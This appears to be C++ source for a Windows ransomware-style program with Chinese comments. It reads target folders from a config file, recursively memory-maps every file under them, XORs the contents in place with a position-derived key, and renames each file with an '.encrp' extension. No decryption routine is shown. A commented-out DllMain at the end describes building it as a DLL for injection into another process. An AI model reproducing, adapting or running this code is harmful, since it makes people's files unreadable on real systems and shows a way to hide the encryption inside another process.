#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <vector>
#include <io.h>
#include "log.h"



#define MALLOC_SIZE (1024*1024)
#define BUFFER_SIZE (1024*128)
#define randm 31
#define MAX(a,b) (a>b?a:b)
#define MIN(a,b) (a>b?b:a)


Log g_log(J_DEBUG, "encrypt.log", 50);
//加密标志
std::string g_encrypt_flag = ".encrp";
//config的存在目录，此为当前
std::string g_config_dir = "";
//设置config文件名:			en_config.encrp
//文件内容不能含有中文,因为在fscanf的时候会读取错误
//想要解决读取中文出错的问题，参考:https://blog.csdn.net/lwj8819/article/details/119610667
std::string g_config_file = g_config_dir+"en_config" + g_encrypt_flag;


std::vector<std::string> g_crypt_path;


//检查该文件是否已经被加密过
bool cryptCheck(std::string i_file_name,std::string i_flag= g_encrypt_flag)
{
	bool res_func = false;
	int len_a = i_file_name.size(), len_b = i_flag.size();
	int start_pos =0;
	if (len_a < len_b)
	{
		goto __end__;
	}
	start_pos =  len_a - len_b;
	for (int i = 0; i < i_flag.size(); ++i)
	{
		if (i_file_name[i + start_pos] != i_flag[i])
		{
			goto __end__;
		}
	}
	res_func = true;
__end__:
	return res_func;
}

/*	一个块内的加密
*	i_data:			起始位置
*	i_data_size:	该块的大小
*	i_index:		第几个块(从0开始)
*/
void cryptData(uint8_t * i_data, const uint64_t i_data_size, const uint64_t i_index) //数据加密
{
	LOG_DEBUG(g_log, "cryptData begpos:%lld  crypt size:%lld", i_index*i_data_size, i_data_size);
	for (uint64_t i = 0; i < i_data_size; i++)
	{
		uint64_t cur_pos = i_index * i_data_size + i + 1;
		i_data[i] = i_data[i] ^ (cur_pos * randm);
	}
}

//对mmap中的内容进行加密，大小为i_max_file_size
bool cryptFile(HANDLE &i_fileMappingObject, const uint64_t i_max_file_size)
{
	if (i_max_file_size == 0)
	{
		LOG_DEBUG(g_log, "such File nothing!\n");
		return true;
	}
	int index_count = (i_max_file_size / MALLOC_SIZE) + 1;
	void* mappedFileAddress = NULL;
	bool res_func = true;

	//文件内的偏移
	LARGE_INTEGER offset;
	memset(&offset, 0, sizeof(offset));
	for (int i = 0; i < index_count; i++)
	{
		//映射一部分
		uint64_t mmap_size = MIN(MALLOC_SIZE, i_max_file_size);
		mmap_size = MIN(mmap_size, (i_max_file_size - i * MALLOC_SIZE));

		mappedFileAddress = MapViewOfFile(i_fileMappingObject, FILE_MAP_ALL_ACCESS, offset.HighPart, offset.LowPart, mmap_size);
		offset.QuadPart += MALLOC_SIZE;
		if (mappedFileAddress == NULL)
		{
			res_func = false;
			LOG_DEBUG(g_log, "MapViewOfFile ERROR!\n");
			goto __end__;
		}

		//执行加密
		cryptData((uint8_t*)mappedFileAddress, mmap_size, i);
		//FlushViewOfFile(mappedFileAddress, 0);
		bool bFlag = UnmapViewOfFile(mappedFileAddress);
		if (!bFlag)
		{
			res_func = false;
			LOG_DEBUG(g_log, "UnmapViewOfFile Fail!%ld occurred closing the mapping object!", GetLastError());
		}
	}
__end__:
	return res_func;
}

uint64_t get_file_size(const HANDLE &dumpFileDescriptor)
{
	LARGE_INTEGER file_size;
	memset(&file_size, 0, sizeof(file_size));
	GetFileSizeEx(dumpFileDescriptor, &file_size);
	uint64_t res = file_size.QuadPart;
	return res;
}

//对单个文件执行mmap和进行处理
bool mmap_file(HANDLE &i_dumpFileDescriptor)
{
	bool res_func = true;

	//获取文件大小
	uint64_t leng = get_file_size(i_dumpFileDescriptor);
	LOG_DEBUG(g_log, "[mmap] file size:%lld", leng);
	//mmap
	HANDLE fileMappingObject = CreateFileMapping(i_dumpFileDescriptor, NULL, PAGE_READWRITE, 0, 0, NULL);
	//关闭原文件
	CloseHandle(i_dumpFileDescriptor);

	//mmap fail
	if (fileMappingObject == INVALID_HANDLE_VALUE)
	{
		res_func = false;
		LOG_DEBUG(g_log, "CreateFileMapping ERROR!\n");
		goto __end__;
	}

	//获取mmap中的内容
	//加密文件数据:
	if (!cryptFile(fileMappingObject, leng))
	{
		res_func = false;
		LOG_DEBUG(g_log, "cryptFile ERROR!\n", );
		goto __end__;
	}

__end__:
	CloseHandle(fileMappingObject);

	return res_func;
}

bool operatorToFile(const char*i_file_name, std::string i_flag = g_encrypt_flag)
{
	bool res_func = true;
	std::string encryptFileName = "";
	if (cryptCheck(i_file_name, i_flag))
	{
		LOG_DEBUG(g_log, "Skip File! FILE NAME:%s", i_file_name);
		return true;
	}

	HANDLE dumpFileDescriptor = CreateFileA(i_file_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (dumpFileDescriptor == INVALID_HANDLE_VALUE)
	{
		res_func = false;
		LOG_DEBUG(g_log, "[CreateFileA] Fail!\n");
		goto __end__;
	}

	if (!mmap_file(dumpFileDescriptor))
	{
		res_func = false;
		LOG_DEBUG(g_log, "[mmap_file] Fail!\n");
		goto __end__;
	}

	LOG_DEBUG(g_log, "[operatorToFile] Success!");

	encryptFileName = i_file_name;
	encryptFileName += i_flag;
	if (rename(i_file_name, encryptFileName.c_str())==0)
	{
		LOG_DEBUG(g_log, "Rename \"%s\" to \"%s\"!", i_file_name, encryptFileName.c_str());
	}
__end__:
	return res_func;
}

bool operatorToFile(const char*i_file_name)
{
	return operatorToFile(i_file_name, g_encrypt_flag);
}
typedef bool(*fun_op)(const char*i_file_name);

/*	遍历目录，执行operatorToFile
 i_operatorPath:	文件夹路径
*/
void loopFile(const char*i_operatorPath, fun_op i_operate = operatorToFile)
{
	LOG_DEBUG(g_log, "[loopFile] start!	DIR NAME:%s\n", i_operatorPath);
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	char szDir[MAX_PATH];
	snprintf(szDir, sizeof(szDir) - 1, i_operatorPath);
	strcat(szDir, "\\*");
	HANDLE hFind = FindFirstFile(szDir, &ffd);

	// List all the files in the directory with some info about them.
	do
	{
		//文件夹路径
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{

			if (!strcmp(ffd.cFileName, ".") || !strcmp(ffd.cFileName, ".."))
				continue;
			//新的一级文件夹
			char new_szDir[MAX_PATH] = { 0 };
			strncpy(new_szDir, szDir, sizeof(new_szDir) - 1);
			new_szDir[strlen(new_szDir) - 1] = '\0'; //去除 *
			strcat(new_szDir, ffd.cFileName);
			loopFile(new_szDir, i_operate);
		}
		else{
			//aim_file:文件的完整路径
			char aim_file[MAX_PATH] = { 0 };
			strncpy(aim_file, szDir, sizeof(aim_file) - 1);
			aim_file[strlen(aim_file) - 1] = '\0'; //去除 *
			strcat(aim_file, ffd.cFileName);

			LOG_DEBUG(g_log, "[operate] Start!		FILE NAME:%s", aim_file);
			//对该文件进行处理
			if (!i_operate(aim_file))
			{
				LOG_DEBUG(g_log, "[operate] error!		FILE NAME:%s\n", aim_file);
			}
			else
			{
				LOG_DEBUG(g_log, "[operate] success!		FILE NAME:%s\n", aim_file);
			}
		}
	} while (FindNextFile(hFind, &ffd) != 0);
	FindClose(hFind);
}

DWORD WINAPI Task(LPVOID lpParam)
{
	LOG_DEBUG(g_log, "[Task] Start!\n");
	char szDir[MAX_PATH];
	for (int i = 0; i < g_crypt_path.size(); ++i)
	{
		snprintf(szDir, sizeof(szDir) - 1, g_crypt_path[i].c_str());
		loopFile(szDir, operatorToFile);
	}
	g_crypt_path.clear();
	LOG_DEBUG(g_log, "[Task] Finish!\n");
	return 0;
}

void init_path(std::string i_encrypt_path) {
	LOG_DEBUG(g_log, "[init_path] add path:%s!\n", i_encrypt_path.c_str());
	g_crypt_path.emplace_back(i_encrypt_path);
}

void init_config(std::string i_config_file= g_config_file)
{
	FILE*fp = NULL;
	LOG_DEBUG(g_log, "[init_config] start!	config name:%s", i_config_file.c_str());\
	fp = fopen(i_config_file.c_str(), "r");
	if (fp == NULL)
	{
		LOG_DEBUG(g_log, "[init_config] Error! %s not exist!\n", i_config_file.c_str());
		goto __end__;
	}
	while (!feof(fp))
	{
		char tmp_path[MAX_PATH];
		memset(tmp_path, 0, sizeof(tmp_path));
		fscanf(fp,"%s", tmp_path);
		if (access(tmp_path, 0) == 0)
		{
			init_path(tmp_path);
		}
	}
	LOG_DEBUG(g_log, "[init_config] Finish!\n");
__end__:
	if (fp != NULL)
	{
		fclose(fp);
	}
	return;
}

//创建线程的函数
int op_thread()
{
	HANDLE hfile;
	DWORD ThreadID;
	//创建线程
	HANDLE hHandle = CreateThread(NULL, 0, Task, NULL, 0, &ThreadID);

	//等待线程结束
	//WaitForSingleObject(hHandle, INFINITE);
	//关闭文件句柄
	//CloseHandle(hHandle);
	return 0;
}

int main()
{
	//设置加密根目录
	//init_path("D:\\Desktop\\测试存放");
	init_config();
	op_thread();
	getchar();
}

//生成dll 用于dll注入(process hacker)

	//BOOL WINAPI DllMain(
	//	_In_ HINSTANCE hinstDLL, // 指向自身的句柄
	//	_In_ DWORD fdwReason, // 调用原因
	//	_In_ LPVOID lpvReserved // 隐式加载和显式加载)
	//)
	//{		
	//	switch (fdwReason)
	//	{
	//	case DLL_PROCESS_ATTACH:
	//		 LOG_DEBUG(g_log, "DLL_PROCESS_ATTACH");
	//		 //设置加密根目录
	//		 init_path("D:\\Desktop\\测试存放");
	//		 op_thread();
	//		 break;
	//	case DLL_THREAD_ATTACH:
	//		LOG_DEBUG(g_log, "DLL_THREAD_ATTACH");
	//		break;
	//	case DLL_THREAD_DETACH:
	//		LOG_DEBUG(g_log, "DLL_THREAD_DETACH");
	//		break;
	//	case DLL_PROCESS_DETACH:
	//		LOG_DEBUG(g_log, "DLL_PROCESS_DETACH");
	//		break;
	//	}
	//	return TRUE;
	//}